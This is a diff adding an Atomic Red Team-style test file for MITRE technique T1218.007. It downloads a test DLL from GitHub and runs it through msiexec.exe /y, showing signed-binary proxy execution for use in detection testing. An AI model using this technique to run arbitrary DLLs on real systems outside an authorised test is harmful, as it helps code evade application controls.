@@ -1,0 +1,13 @@
+#TechniqueName: Signed Binary Proxy Execution: Msiexec
+#AtomicTestName: Msiexec.exe - Execute Arbitrary DLL
+#Description: Execute arbitrary DLL file stored locally. Commonly seen in application installation.&Upon execution, a window titled "Boom!" will open that says "Locked and Loaded!". For 32 bit systems change the dll_payload argument to the Win32 folder.&By default, if the src folder is not in place, it will download the 64 bit version.&
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1218.007\src\x64\T1218.dll) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/x64/T1218.dll" -OutFile "PathToAtomicsFolder\T1218.007\src\x64\T1218.dll"
+
+
+#commands
+msiexec.exe /y "PathToAtomicsFolder\T1218.007\src\x64\T1218.dll"
+
